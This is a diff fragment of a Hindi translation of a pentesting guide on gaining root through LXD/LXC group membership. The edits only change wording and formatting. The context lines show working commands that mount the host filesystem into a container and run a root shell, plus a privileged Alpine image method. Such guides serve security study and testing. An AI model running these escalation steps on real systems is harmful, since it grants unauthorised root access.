@@ -50,7 +50,7 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 > [!CAUTION]
 > यदि आप इस त्रुटि को पाते हैं _**त्रुटि: कोई स्टोरेज पूल नहीं मिला। कृपया एक नया स्टोरेज पूल बनाएं**_\
-> **`lxd init`** चलाएं और **पिछले आदेशों के समूह को दोहराएं**
+> **`lxd init`** चलाएं और **पिछले** आदेशों के समूह को **दोहराएं**
 
 अंत में, आप कंटेनर को निष्पादित कर सकते हैं और रूट प्राप्त कर सकते हैं:
 ```bash
@@ -58,9 +58,9 @@ lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### Method 2
+### विधि 2
 
-एक Alpine इमेज बनाएं और इसे `security.privileged=true` फ्लैग का उपयोग करके शुरू करें, जिससे कंटेनर को होस्ट फाइल सिस्टम के साथ रूट के रूप में इंटरैक्ट करने के लिए मजबूर किया जा सके।
+एक Alpine इमेज बनाएं और इसे `security.privileged=true` ध्वज का उपयोग करके शुरू करें, जिससे कंटेनर को होस्ट फ़ाइल सिस्टम के साथ रूट के रूप में इंटरैक्ट करने के लिए मजबूर किया जा सके।
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
